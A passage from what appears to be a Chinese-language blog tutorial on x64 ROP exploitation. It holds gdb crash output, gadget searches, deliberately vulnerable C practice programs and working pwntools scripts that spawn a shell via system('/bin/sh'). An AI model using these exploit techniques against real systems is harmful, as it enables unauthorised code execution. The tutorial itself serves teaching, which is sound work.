class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ gdb level3 </span><br><span class="line">pwndbg&gt; r &lt; payload </span><br><span class="line">Starting program: /home/buffer/桌面/practice/ROP_x64/0x01/level3 &lt; payload</span><br><span class="line">Hello, World</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x00000000004005e7 <span class="keyword">in</span> vulnerable_function ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  0x97</span><br><span class="line"> RBX  0x0</span><br><span class="line">*RCX  0x7ffff7b04260 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line">*RDX  0x200</span><br><span class="line"> RDI  0x0</span><br><span class="line">*RSI  0x7fffffffdc50 ◂— 0x6141316141306141 (<span class="string">'Aa0Aa1Aa'</span>)</span><br><span class="line">*R8   0x400690 (__libc_csu_fini) ◂— ret    </span><br><span class="line">*R9   0x7ffff7de7ab0 (_dl_fini) ◂— push   rbp</span><br><span class="line">*R10  0x37b</span><br><span class="line">*R11  0x246</span><br><span class="line">*R12  0x4004c0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">*R13  0x7fffffffddd0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line">*RBP  0x4134654133654132 (<span class="string">'2Ae3Ae4A'</span>)</span><br><span class="line">*RSP  0x7fffffffdcd8 ◂— 0x3765413665413565 (<span class="string">'e5Ae6Ae7'</span>)</span><br><span class="line">*RIP  0x4005e7 (vulnerable_function+32) ◂— ret    </span><br><span class="line">────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x4005e7 &lt;vulnerable_function+32&gt;    ret    &lt;0x3765413665413565&gt;</span><br></pre></td></tr></table></figure><p>奇怪的事情发生了，<code>PC指针</code>并没有指向类似于<code>0x41414141</code>那样地址，而是停在了<code>vulnerable_function()</code>函数中。这是为什么呢？原因就是我们之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为<code>ret相当于“pop rip”</code>指令，所以我们只要看一下<code>栈顶的数值</code>就能知道PC跳转的地址了。其实上面已经可以看到了，这就是pwndbg的好处。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx <span class="variable">$rsp</span></span><br><span class="line">0x7fffffffdcd8:0x3765413665413565</span><br></pre></td></tr></table></figure><p>在GDB里，x是查看内存的指令，随后的gx代表数值用64位16进制显示。随后我们就可以用pattern.py来计算溢出点。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python pattern.py offset 0x3765413665413565</span><br><span class="line">hex pattern decoded as: e5Ae6Ae7</span><br><span class="line">136</span><br></pre></td></tr></table></figure><p>可以看到<code>溢出点为136字节</code>。我们再构造一次payload，并且跳转到一个<code>小于0x00007fffffffffff</code>的地址，看看这次能否控制pc的指针。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">'print "A"*136+"ABCDEF\x00\x00"'</span> &gt; payload</span><br><span class="line">$ cat payload </span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEF</span><br><span class="line">$ gdb level3 </span><br><span class="line">pwndbg&gt; r &lt; payload </span><br><span class="line">Starting program: /home/buffer/桌面/practice/ROP_x64/0x01/level3 &lt; payload</span><br><span class="line">Hello, World</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x0000464544434241 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  0x91</span><br><span class="line"> RBX  0x0</span><br><span class="line">*RCX  0x7ffff7b04260 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line">*RDX  0x200</span><br><span class="line"> RDI  0x0</span><br><span class="line">*RSI  0x7fffffffdc50 ◂— 0x4141414141414141 (<span class="string">'AAAAAAAA'</span>)</span><br><span class="line">*R8   0x400690 (__libc_csu_fini) ◂— ret    </span><br><span class="line">*R9   0x7ffff7de7ab0 (_dl_fini) ◂— push   rbp</span><br><span class="line">*R10  0x37b</span><br><span class="line">*R11  0x246</span><br><span class="line">*R12  0x4004c0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">*R13  0x7fffffffddd0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line">*RBP  0x4141414141414141 (<span class="string">'AAAAAAAA'</span>)</span><br><span class="line">*RSP  0x7fffffffdce0 —▸ 0x7fffffffdd0a ◂— 0x7fffffff</span><br><span class="line">*RIP  0x464544434241</span><br><span class="line">────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x464544434241</span><br></pre></td></tr></table></figure><p>可以看到我们已经<code>成功的控制了PC</code>的指针了。所以最终的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">p = process(<span class="string">'./level3'</span>)</span><br><span class="line"><span class="comment">#p = remote('127.0.0.1',10001)</span></span><br><span class="line">callsystem_addr = <span class="number">0x00000000004005b6</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">136</span></span><br><span class="line">payload += p64(callsystem_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>执行效果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python level1_exp.py </span><br><span class="line">[*] <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x64/0x01/level3'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./level3'</span>: pid 10522</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">buffer</span><br></pre></td></tr></table></figure><h3 id="0x03使用工具寻找gadgets"><a href="#0x03使用工具寻找gadgets" class="headerlink" title="0x03使用工具寻找gadgets"></a>0x03使用工具寻找gadgets</h3><p>我们之前提到x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有<code>更多的参数</code>的话才会<code>保存在栈上</code>。所以我们需要寻找一些类似于<code>pop rdi; ret</code>的这种<code>gadget</code>。如果是简单的gadgets，我们可以通过<code>objdump</code>来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些<code>查找gadgets的工具</code>比较方便。比较有名的工具有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPEME: https://github.com/packz/ropeme</span><br><span class="line">Ropper: https://github.com/sashs/Ropper</span><br><span class="line">ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master</span><br><span class="line">rp++: https://github.com/0vercl0k/rp</span><br></pre></td></tr></table></figure><p>这些工具功能上都差不多，找一款自己能用的惯的即可。</p><p>下面我们结合例子来讲解，首先来看一下目标程序<code>level4.c</code>的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">systemaddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* handle = dlopen(<span class="string">"libc.so.6"</span>, RTLD_LAZY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,dlsym(handle,<span class="string">"system"</span>));</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    systemaddr();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector level4.c -o level4 -ldl</span><br></pre></td></tr></table></figure><p>首先目标程序会<code>打印system()</code>在<code>内存中的地址</code>，这样的话就不需要我们考虑<code>ASLR</code>的问题了，只需要想办法触发buffer overflow然后<code>利用ROP执行system(“/bin/sh”)</code>。但为了调用system(“/bin/sh”)，我们需要找到一个gadget将<code>rdi</code>的值指向<code>“/bin/sh”的地址</code>。于是我们使用<code>ROPGadget</code>搜索一下level4中所有<code>pop ret</code>的gadgets。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget  --binary level4 --only <span class="string">"pop|ret"</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004008ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008ae : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008b0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008b2 : pop r15 ; ret</span><br><span class="line">0x00000000004008ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008af : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400700 : pop rbp ; ret</span><br><span class="line">0x00000000004008b3 : pop rdi ; ret</span><br><span class="line">0x00000000004008b1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004008ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400601 : ret</span><br><span class="line">0x0000000000400682 : ret 0x2009</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 12</span><br></pre></td></tr></table></figure><p>结果并不理想，因为程序比较小，在目标程序中并不能找到<code>pop rdi; ret</code>这个gadget。怎么办呢？解决方案是寻找<code>libc.so</code>中的gadgets。因为程序本身会load libc.so到内存中并且会打印system()的地址。所以当我们找到gadgets后可以<code>通过system()</code>计算出<code>偏移量</code>后调用对应的gadgets。(我这里找到了，估计是ROPgadget版本不一样吧，但是不行，exp执行不了，还是libc.so里的可以)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget  --binary libc.so.6 --only <span class="string">"pop|ret"</span> | grep rdi</span><br><span class="line">0x0000000000020256 : pop rdi ; pop rbp ; ret</span><br><span class="line">0x0000000000021102 : pop rdi ; ret</span><br><span class="line">0x0000000000067499 : pop rdi ; ret 0xffff</span><br></pre></td></tr></table></figure><p>这次我们成功的找到了“pop rdi; ret”这个gadget了。也就可以构造我们的ROP链了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"\x00"</span>*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure><p>另外，因为我们<code>只需调用一次system()</code>函数就可以获取shell，所以我们也可以搜索<code>不带ret的gadgets</code>来构造ROP链。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget  --binary libc.so.6 --only <span class="string">"pop|call"</span> | grep rdi</span><br><span class="line">0x0000000000196aab : call qword ptr [rdi + rbp*2 + 0x7fa40000]</span><br><span class="line">0x000000000019ade3 : call qword ptr [rdi + rbx + 2]</span><br><span class="line">0x000000000007d8b0 : call qword ptr [rdi]</span><br><span class="line">0x0000000000023e56 : call rdi</span><br><span class="line">0x0000000000107419 : pop rax ; pop rdi ; call rax</span><br><span class="line">0x000000000010741a : pop rdi ; call rax</span><br></pre></td></tr></table></figure><p>通过搜索结果我们发现，<code>0x00000000000f4739 : pop rax ; pop rdi ; call rax</code>也可以完成我们的目标。首先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"\x00"</span>*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)</span><br></pre></td></tr></table></figure><p>所以说这两个ROP链都可以完成我们的目标，随便选择一个进行攻击即可。最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">p = process(<span class="string">'./level4'</span>)</span><br><span class="line"><span class="comment">#p = remote('127.0.0.1',10001)</span></span><br><span class="line"></span><br><span class="line">binsh_addr_offset = int(next(libc.search(<span class="string">'/bin/sh'</span>),<span class="number">16</span>) - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"binsh_addr_offset= "</span> + hex(binsh_addr_offset)</span><br><span class="line"></span><br><span class="line">pop_ret_offset = <span class="number">0x0000000000021102</span> - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"pop_ret_offset= "</span> + hex(pop_ret_offset)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pop_pop_call_offset = 0x0000000000107419 - libc.symbols['system']</span></span><br><span class="line"><span class="comment">#print "pop_pop_call_offset= " + hex(pop_pop_call_offset)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n##########receving system addr############\n"</span></span><br><span class="line">system_addr_str = p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">system_addr = int(system_addr_str,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr= "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">binsh_addr = system_addr + binsh_addr_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"binsh_addr= "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">pop_ret_addr = system_addr + pop_ret_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"pop_ret_addr= "</span> + hex(pop_ret_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pop_pop_call_addr = system_addr + pop_pop_call_offset</span></span><br><span class="line"><span class="comment">#print "pop_pop_call_addr = " + hex(pop_pop_call_addr)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">136</span></span><br><span class="line">payload += p64(pop_ret_addr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = 'A'*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###########sending payload###########\n"</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ python level2_exp.py </span><br><span class="line">[*] <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x64/0x02/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./level4'</span>: pid 10853</span><br><span class="line">binsh_addr_offset= 0x1479c7</span><br><span class="line">pop_ret_offset= -0x2428e</span><br><span class="line"></span><br><span class="line"><span class="comment">##########receving system addr############</span></span><br><span class="line"></span><br><span class="line">system_addr= 0x7f0357f17390</span><br><span class="line">binsh_addr= 0x7f035805ed57</span><br><span class="line">pop_ret_addr= 0x7f0357ef3102</span><br><span class="line"></span><br><span class="line"><span class="comment">###########sending payload###########</span></span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">buffer</span><br></pre></td></tr></table></figure><h3 id="0x04-通用gadgets"><a href="#0x04-通用gadgets" class="headerlink" title="0x04 通用gadgets"></a>0x04 通用gadgets</h3><p>因为程序在编译过程中会加入一些通用函数用来进行<code>初始化操作</code>（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些<code>通用的gadgets</code>加以使用，从而达到我们想要达到的效果。</p><p>为了方便大家学习x64下的ROP，level3和level4的程序都留了一些辅助函数在程序中，这次我们将这些<code>辅助函数</code>去掉再来挑战一下。目标程序level5.c如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法<code>泄露内存</code>信息，找到system()的值，然后再传递<code>“/bin/sh”</code>到<code>.bss段</code>, 最后调用system(“/bin/sh”)。因为原程序使用了<code>write()</code>和<code>read()</code>函数，我们可以通过<code>write()</code>去输出<code>write.got</code>的地址，从而计算出<code>libc.so在内存中的地址</code>。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过<code>寄存器传值</code>。我们使用ROPgadget并没有找到类似于<code>pop rdi, ret,pop rsi, ret</code>这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./level5观察一下<code>__libc_csu_init()</code>这个函数。一般来说，只要程序调用了<code>libc.so</code>，程序都会有这个函数用来对libc进行初始化操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">00000000004005c0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4005c0:41 57                push   %r15</span><br><span class="line">  4005c2:41 56                push   %r14</span><br><span class="line">  4005c4:41 89 ff             mov    %edi,%r15d</span><br><span class="line">  4005c7:41 55                push   %r13</span><br><span class="line">  4005c9:41 54                push   %r12</span><br><span class="line">  4005cb:4c 8d 25 3e 08 20 00 lea    0x20083e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  4005d2:55                   push   %rbp</span><br><span class="line">  4005d3:48 8d 2d 3e 08 20 00 lea    0x20083e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;</span><br><span class="line">  4005da:53                   push   %rbx</span><br><span class="line">  4005db:49 89 f6             mov    %rsi,%r14</span><br><span class="line">  4005de:49 89 d5             mov    %rdx,%r13</span><br><span class="line">  4005e1:4c 29 e5             sub    %r12,%rbp</span><br><span class="line">  4005e4:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4005e8:48 c1 fd 03          sar    $0x3,%rbp</span><br><span class="line">  4005ec:e8 0f fe ff ff       callq  400400 &lt;_init&gt;</span><br><span class="line">  4005f1:48 85 ed             test   %rbp,%rbp</span><br><span class="line">  4005f4:74 20                je     400616 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  4005f6:31 db                xor    %ebx,%ebx</span><br><span class="line">  4005f8:0f 1f 84 00 00 00 00 nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4005ff:00 </span><br><span class="line">  400600:4c 89 ea             mov    %r13,%rdx</span><br><span class="line">  400603:4c 89 f6             mov    %r14,%rsi</span><br><span class="line">  400606:44 89 ff             mov    %r15d,%edi</span><br><span class="line">  400609:41 ff 14 dc          callq  *(%r12,%rbx,8)</span><br><span class="line">  40060d:48 83 c3 01          add    $0x1,%rbx</span><br><span class="line">  400611:48 39 eb             cmp    %rbp,%rbx</span><br><span class="line">  400614:75 ea                jne    400600 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  400616:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  40061a:5b                   pop    %rbx</span><br><span class="line">  40061b:5d                   pop    %rbp</span><br><span class="line">  40061c:41 5c                pop    %r12</span><br><span class="line">  40061e:41 5d                pop    %r13</span><br><span class="line">  400620:41 5e                pop    %r14</span><br><span class="line">  400622:41 5f                pop    %r15</span><br><span class="line">  400624:c3                   retq</span><br></pre></td></tr></table></figure><p>我们可以看到利用<code>0x400606</code>处的代码我们可以控制<code>rbx,rbp,r12,r13,r14和r15</code>的值，随后利用<code>0x4005f0</code>处的代码我们将<code>r15</code>的值赋值给<code>rdx</code>, <code>r14</code>的值赋值给<code>rsi</code>,<code>r13</code>的值赋值给<code>edi</code>，随后就会调用<code>call qword ptr [r12+rbx\*8]</code>。这时候我们只要再将<code>rbx</code>的值赋值为<code>0</code>，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果<code>相等</code>就会继续向下执行并<code>ret</code>到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将<code>rbp</code>的值设置为<code>1</code>，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。这里借用一张别人画的图，看一下栈中的数据分布：</p><div align="left"><br>    <img src="/resources/2018/2018-05-11-00.png" 